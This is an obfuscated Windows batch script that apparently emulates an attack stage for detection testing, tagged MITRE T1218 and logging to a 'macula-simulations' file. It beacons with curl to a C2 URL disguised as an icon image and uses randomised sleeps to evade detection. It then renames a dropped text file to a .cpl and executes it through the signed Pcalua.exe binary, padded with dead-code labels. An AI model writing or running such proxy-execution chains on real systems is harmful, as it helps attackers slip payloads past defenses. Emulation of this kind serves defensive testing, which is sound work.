@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET aebqx=%APPDATA%\8924\e32ec6e5
SET bdtnwe=Macula-Stage0-8924
SET yhqkf=https://10.0.0.49
SET kjnmr=https://10.0.0.49/stage/2/icon.png?8924-7
SET rjxhq=BALAM-S2BO
SET ujntd=7
SET pxtkg=firelox.txt
SET kzdfb=8924
SET evjdf=%APPDATA%\!ujntd!\macula-simulations.log
SET azcrf=T1218
SET kqbvr=Signed Binary Proxy Execution

SET rnd=0
SET mcyr=0
SET wtdq=ERROR
GOTO jdkwl

:rpsfn
REM Dead code block
IF 0==1 GOTO bnzcv
EXIT /B

:jdkwl
timeout /t 12 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!rjxhq!]: delay_start=12s>> "!evjdf!" 2>nul
SET mcyr=0
GOTO xmtnp

:bnzcv
REM Never reached
SET fake=deadcode

:xmtnp
echo [!DATE! !TIME!][DEBUG][!rjxhq!]: c2_heartbeat_start>> "!evjdf!" 2>nul
curl -k -s -o nul "!kjnmr!"
IF NOT ERRORLEVEL 1 (
    SET rnd=1
    SET wtdq=
) ELSE (
    SET rnd=0
    SET wtdq=curl_failed
)
SET tpstmp=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !TIME:~0,2!-!TIME:~3,2!-!TIME:~6,2!.000
echo [!tpstmp!][!rjxhq!]: !ujntd!-!kzdfb!-!azcrf!|!kqbvr!=!rnd!:!wtdq!>> "!evjdf!" 2>nul
echo [!DATE! !TIME!][DEBUG][!rjxhq!]: c2_heartbeat_complete=!rnd!>> "!evjdf!" 2>nul
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!rjxhq!]: delay_start=8s>> "!evjdf!" 2>nul
SET mcyr=17
GOTO nfsbj

:lwxyz
REM Dead code block
GOTO zqplm

:nfsbj
IF !mcyr!==17 GOTO ypmvc
IF !mcyr!==42 GOTO qljhp
IF !mcyr!==99 GOTO vtxmn
GOTO zqplm

:ypmvc
echo [!DATE! !TIME!][DEBUG][!rjxhq!]: file_rename_start>> "!evjdf!" 2>nul
RENAME "!aebqx!\!pxtkg!" "pcafile.cpl" >nul 2>&1
IF NOT ERRORLEVEL 1 (
    SET rnd=1
    SET wtdq=
) ELSE (
    SET rnd=0
    SET wtdq=rename_failed
)
SET tpstmp=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !TIME:~0,2!-!TIME:~3,2!-!TIME:~6,2!.000
echo [!tpstmp!][!rjxhq!]: !ujntd!-!kzdfb!-!azcrf!|!kqbvr!=!rnd!:!wtdq!>> "!evjdf!" 2>nul
echo [!DATE! !TIME!][DEBUG][!rjxhq!]: file_rename_complete=!rnd!>> "!evjdf!" 2>nul
CHOICE /C Y /N /D Y /T 11 >nul
echo [!DATE! !TIME!][DEBUG][!rjxhq!]: delay_start=11s>> "!evjdf!" 2>nul
SET mcyr=42
GOTO nfsbj

:qljhp
SET /A dly=!RANDOM! %% 15 + 10
timeout /t !dly! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!rjxhq!]: random_delay_start=!dly!s>> "!evjdf!" 2>nul
echo [!DATE! !TIME!][DEBUG][!rjxhq!]: dll_load_start>> "!evjdf!" 2>nul
%SystemRoot%\System32\Pcalua.exe -a "!aebqx!\pcafile.cpl" >nul 2>&1
IF NOT ERRORLEVEL 1 (
    SET rnd=1
    SET wtdq=
) ELSE (
    SET rnd=0
    SET wtdq=execution_failed
)
SET tpstmp=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !TIME:~0,2!-!TIME:~3,2!-!TIME:~6,2!.000
echo [!tpstmp!][!rjxhq!]: !ujntd!-!kzdfb!-!azcrf!|!kqbvr!=!rnd!:!wtdq!>> "!evjdf!" 2>nul
echo [!DATE! !TIME!][DEBUG][!rjxhq!]: dll_load_complete=!rnd!>> "!evjdf!" 2>nul
SET mcyr=99
GOTO nfsbj

:ghjkn
REM Unreachable dead code
SET junk=data

:zqplm
SET mcyr=99
GOTO vtxmn

:vtxmn
echo [!DATE! !TIME!][DEBUG][!rjxhq!]: script_end>> "!evjdf!" 2>nul
ENDLOCAL